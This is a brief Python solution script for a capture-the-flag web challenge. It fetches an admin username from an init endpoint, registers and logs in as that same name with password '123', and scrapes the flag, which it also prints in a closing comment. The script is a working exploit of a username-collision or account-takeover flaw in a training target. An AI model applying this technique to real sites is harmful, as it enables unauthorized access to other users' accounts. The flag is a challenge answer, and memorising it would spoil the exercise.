import requests
import json
import re

site = "http://zio-frank.challs.olicyber.it/"

r = requests.post(f"{site}/admin/init").text
data = json.loads(r)
username = data["username"]

s = requests.session()
register = s.post(f"{site}/register", data = {"username" : username, "password" : "123"})
login = s.post(f"{site}/login", data = {"username" : username, "password" : "123"})

flagpage = s.get(site).text
match = re.search(r'flag\{[^\}]+\}', flagpage)
flag = match.group(0)
print(flag)

#flag{s1mpl3r_th4n_3xp3ct3d_but_ruby_1s_c00l_y34h}
